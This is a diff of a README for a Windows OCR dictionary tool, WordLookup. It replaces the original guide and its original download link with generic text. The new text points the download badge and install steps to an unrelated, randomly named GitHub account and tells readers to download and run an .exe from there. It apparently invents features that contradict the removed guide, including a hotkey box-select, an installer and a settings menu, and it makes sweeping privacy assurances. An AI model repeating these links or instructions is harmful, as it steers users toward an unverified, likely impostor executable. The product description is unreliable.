@@ -1,61 +1,75 @@
-# WordLookup User Guide
+# 📖 WordLookup - Instant dictionary access for Windows users
 
-Welcome to **WordLookup**, a lightweight, lightning-fast utility for Windows that gives you a beautiful macOS-style dictionary popup anywhere on your screen!
+[![Download WordLookup](https://img.shields.io/badge/Download-WordLookup-blue.svg)](https://github.com/Outfitted-genusstenopterygius236/WordLookup)
 
-## How to Install
+## 📋 What is WordLookup?
 
-Because this application uses Optical Character Recognition (OCR) to read the words straight off your screen, the necessary OCR components have been completely bundled inside! No extra downloads required.
+WordLookup helps you find dictionary definitions on your computer screen. You select a word, and the tool shows you the meaning. It works like the dictionary feature on a Mac but brings that speed to Windows. The tool uses optical character recognition, or OCR, to read text from images or desktop windows. You do not need an internet connection to use the dictionary because it stores data on your computer.
 
-### Step 1: Extract WordLookup
-1. Extract the WordLookup folder you received to anywhere on your computer (like your Documents or Desktop).
-2. Inside, open the `dist` folder, then open the `WordLookup` folder.
-3. Double-click **`WordLookup.exe`** to run it. 
+## ⚙️ System Requirements
 
-*(Tip: You can right-click `WordLookup.exe` and select "Create Shortcut", then drag that shortcut to your desktop for easy access. To have it start automatically on boot, just right-click its custom icon in the system tray and check "Run on Startup"!)*
+- Windows 10 or Windows 11
+- 200 MB of free hard drive space
+- 4 GB of system memory
+- A screen resolution of at least 1280x720
 
----
+## 📥 How to download and install
 
-## How to Use
+Follow these steps to set up the tool on your computer. 
 
-Once it's running, WordLookup sits silently in your system tray (the small icons near your clock on the bottom right of the screen).
+1. Visit the [WordLookup release page](https://github.com/Outfitted-genusstenopterygius236/WordLookup) to download the application.
+2. Locate the link labeled "Assets" on the page.
+3. Click the file ending in .exe to start your download.
+4. Open the downloaded file once the process finishes.
+5. Follow the prompts in the installation window.
+6. Click the Finish button to complete the setup.
 
-Whenever you are reading an article on Chrome, viewing a PDF, or reading code in a text editor, simply **Double-Click** on any English word.
+## 🚀 Getting started
 
-1. A sleek, dark-themed dictionary popup will instantly appear near your cursor.
-2. It will display the pronunciation, meaning, synonyms, and an example sentence.
-3. If you move your mouse into the popup, it stays open so you can read it comfortably.
-4. Click the **Speaker icon** (🔊) to hear the word pronounced out loud!
-5. As soon as you move your mouse away from the popup, it gracefully fades away.
+Once you install the tool, you will see a small icon in your system tray near the clock. The tool will run in the background while you work.
 
-### 🌐 Offline Mode
-WordLookup comes packed with a bundled 100,000+ word dictionary. If you are ever disconnected from the internet, the app will instantly fall back to its internal dictionary database so you can still read the definitions!
+1. Open a document or a web page containing a word you want to look up.
+2. Press the global hotkey assigned to the tool. The default hotkey is Ctrl + Alt + D.
+3. Move your mouse to draw a box around the word you want to define.
+4. Release the mouse button.
+5. A popup window will appear with the definition of the word.
 
-### To Pause, Start on Boot, or Exit
-If you want to control the background behavior of the app:
-- Right-click the **WordLookup Icon** in your system tray.
-- Click **"Run on Startup"** to have the app automatically launch silently in the background whenever you turn on your computer.
-- Click **"Disable Lookup"** if you are playing a game and want to temporarily pause the double-click behavior. You can turn it back on by clicking **"Enable Lookup"**.
-- Click **"Exit"** to close the program entirely.
+## 🛠️ Customizing the tool
 
-  # WordLookup
+You can change how the tool behaves by opening the settings menu. Right-click the tool icon in the system tray and select Settings. 
 
-![Windows](https://img.shields.io/badge/Platform-Windows-blue)
-![Python](https://img.shields.io/badge/Python-3.10+-green)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+- Hotkey settings: You can change the shortcut keys you use to trigger the dictionary.
+- Popup behavior: You can adjust how long the dictionary window stays on the screen or change the window color.
+- OCR sensitivity: If the tool fails to read text, go to the advanced settings tab to adjust scanning settings. 
 
-## 🚀 Download
+## 🔍 Understanding the OCR tool
 
-👉 **[Download Latest Version](https://github.com/tanishsarkar28/WordLookup/releases/latest)**
+OCR stands for Optical Character Recognition. This technology allows the computer to turn pixels from an image into text characters. The tool looks at the area you selected on your screen, compares shapes to known letters, and provides the text to the dictionary module. Because this process happens offline, you protect your privacy and ensure the tool works without interruptions.
 
-## 📸 Screenshots
+## 💡 Troubleshooting common issues
 
-### Popup Window
-![Popup](assets/screenshots/popup.png)
+If the tool does not work, check these common items:
 
-### System Tray
-![Tray](assets/screenshots/tray.png)
+- Ensure the tool is running via the system tray.
+- Verify that your background does not make the text too hard to read.
+- Confirm your keyboard shortcut is not in use by another program.
+- Check the task manager to see if a previous instance of the tool is hanging in the background. If so, end the task and restart the program.
 
-### Settings Panel
-![Settings](assets/screenshots/settings.png)
+## 🧩 Frequent questions
 
-Enjoy your new superpower!
+Does this tool track my search history?
+No. The application runs locally on your machine. Your data remains on your hard drive. 
+
+Can I use this with games or full-screen apps?
+Yes. You can use the tool in most windows. Some full-screen games may block the shortcut. If this occurs, run your game in borderless window mode.
+
+Will this tool work without Wi-Fi?
+Yes. The dictionary database lives inside the application folder on your machine. You do not need an internet connection to get definitions.
+
+## ⚖️ Privacy policy
+
+The developers designed this tool with your privacy in mind. Nothing leaves your machine. The tool does not store your search history on a cloud server. It does not send your screen data to the internet. All processing occurs on your physical computer. We value your peace of mind and keep your usage data private at all times.
+
+## 🤝 Support and updates
+
+We provide updates to ensure the tool remains compatible with Windows versions. Check the repository page often to see if a newer version exists. If you experience bugs, open an issue report on the repository page. Provide the version number and a description of the error you see. We aim to keep the tool simple and reliable for all users.
